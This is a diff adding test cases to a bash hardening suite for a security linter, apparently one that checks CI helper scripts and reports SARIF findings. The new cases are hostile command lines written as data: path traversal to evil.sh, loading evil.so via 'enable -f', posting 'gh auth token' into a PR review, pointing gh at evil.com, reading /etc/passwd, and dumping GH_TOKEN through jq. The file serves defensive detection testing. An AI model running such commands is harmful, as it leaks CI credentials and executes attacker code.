@@ -404,5 +404,38 @@ t nameref-clean-fp 0 "" happy.sarif "$H${FS}set -euo pipefail${FS}a${FS}declare 
 t toctou-alias-nameref 1 "muse-installer-toctou" happy.sarif "$I${FS}got_sha=${FS}a${FS}declare -n replacement=tmp_bin; cat \"\${GITHUB_WORKSPACE}/evil\" > \"\${replacement}\""
 t toctou-alias-nameref-inert-fp 0 "" happy.sarif "$I${FS}got_sha=${FS}a${FS}declare -n replacement=tmp_bin"
 
+# --- trusted-path traversal (Codex P1: SCRIPT_DIR/../../evil) ---
+t traversal-script 1 "helper-untrusted-exec" happy.sarif "$H${FS}set -euo pipefail${FS}a${FS}bash \"\${SCRIPT_DIR}/../../../../evil.sh\""
+t traversal-mid 1 "helper-untrusted-exec" happy.sarif "$H${FS}set -euo pipefail${FS}a${FS}bash \"\${SCRIPT_DIR}/a/../../evil.sh\""
+t traversal-inner-fp 0 "" happy.sarif "$H${FS}set -euo pipefail${FS}a${FS}bash \"\${SCRIPT_DIR}/sub/../guard.sh\""
+t traversal-var 1 "helper-untrusted-exec" happy.sarif "$H${FS}set -euo pipefail${FS}a${FS}bash \"\${SCRIPT_DIR}/\$x\""
+t traversal-direct 1 "helper-untrusted-exec" happy.sarif "$H${FS}set -euo pipefail${FS}a${FS}\"\${SCRIPT_DIR}/../../../../evil.sh\""
+t traversal-abs 1 "helper-untrusted-exec" happy.sarif "$H${FS}set -euo pipefail${FS}a${FS}/usr/bin/../../home/evil/x"
+t traversal-abs-fp 0 "" happy.sarif "$H${FS}set -euo pipefail${FS}a${FS}/usr/bin/jq --version"
+
+# --- dynamic builtins (Codex P1: enable -f evil.so) ---
+t enable-so 1 "helper-untrusted-exec" happy.sarif "$H${FS}set -euo pipefail${FS}a${FS}enable -f \"\${GITHUB_WORKSPACE}/evil.so\" evil"
+t enable-disable 1 "helper-untrusted-exec" happy.sarif "$H${FS}set -euo pipefail${FS}a${FS}enable -n echo"
+t enable-query-fp 0 "" happy.sarif "$H${FS}set -euo pipefail${FS}a${FS}enable -p"
+
+# --- gh confinement (Codex P1: gh api POST + gh auth token) ---
+t gh-exfil 1 "helper-untrusted-exec" happy.sarif "$H${FS}set -euo pipefail${FS}a${FS}gh api --method POST \"repos/\${GITHUB_REPOSITORY}/pulls/\${PR_NUMBER}/reviews\" -f event=COMMENT -f body=\"\$(gh auth token)\""
+t gh-auth-token 1 "helper-untrusted-exec" happy.sarif "$H${FS}set -euo pipefail${FS}a${FS}gh auth token"
+t gh-subcommand 1 "helper-untrusted-exec" happy.sarif "$H${FS}set -euo pipefail${FS}a${FS}gh pr merge 1"
+t gh-hostname 1 "helper-untrusted-exec" happy.sarif "$H${FS}set -euo pipefail${FS}a${FS}gh api --hostname evil.com repos/x"
+t gh-put 1 "helper-untrusted-exec" happy.sarif "$H${FS}set -euo pipefail${FS}a${FS}gh api --method PUT repos/x -f a=b"
+t gh-input-evil 1 "helper-untrusted-exec" happy.sarif "$H${FS}set -euo pipefail${FS}a${FS}gh api --method POST \"repos/\${GITHUB_REPOSITORY}/pulls/\${PR_NUMBER}/reviews\" --input /etc/passwd"
+t gh-field-evil 1 "helper-untrusted-exec" happy.sarif "$H${FS}set -euo pipefail${FS}a${FS}gh api --method POST \"repos/\${GITHUB_REPOSITORY}/pulls/\${PR_NUMBER}/reviews\" --input \"\${RUNNER_TEMP}/muse-review-payload.json\" -f extra=1"
+t gh-post-fp 0 "" happy.sarif "$H${FS}set -euo pipefail${FS}a${FS}gh api --method POST \"repos/\${GITHUB_REPOSITORY}/pulls/\${PR_NUMBER}/reviews\" --input \"\${RUNNER_TEMP}/muse-review-payload.json\""
+t gh-get-fp 0 "" happy.sarif "$H${FS}set -euo pipefail${FS}a${FS}gh api \"repos/\${GITHUB_REPOSITORY}/pulls/\${PR_NUMBER}\""
+t gh-method-last 1 "helper-untrusted-exec" happy.sarif "$H${FS}set -euo pipefail${FS}a${FS}gh api --method GET -X POST repos/evil/x"
+t gh-repo-flag 1 "helper-untrusted-exec" happy.sarif "$H${FS}set -euo pipefail${FS}a${FS}gh api -R evil/repo \"repos/\${GITHUB_REPOSITORY}/pulls/\${PR_NUMBER}\""
+t gh-jq-second 1 "helper-jq-env" happy.sarif "$H${FS}set -euo pipefail${FS}a${FS}gh api repos/x --jq .safe --jq '\$ENV.GH_TOKEN'"
+t gh-host-assign 1 "helper-env-poison" happy.sarif "$H${FS}set -euo pipefail${FS}a${FS}GH_HOST=evil.com"
+
+# --- coproc execution (Codex P1: coproc bash evil.sh) ---
+t coproc-bash 1 "helper-untrusted-exec" happy.sarif "$H${FS}set -euo pipefail${FS}a${FS}coproc bash \"\${GITHUB_WORKSPACE}/evil.sh\""
+t coproc-named 1 "helper-untrusted-exec" happy.sarif "$H${FS}set -euo pipefail${FS}a${FS}coproc FOO cat /tmp/x"
+
 printf '\nhardening suite: %d passed, %d failed%s\n' "$pass" "$fail" "${fail_names:+ ($fail_names)}"
 [[ "$fail" -eq 0 ]]
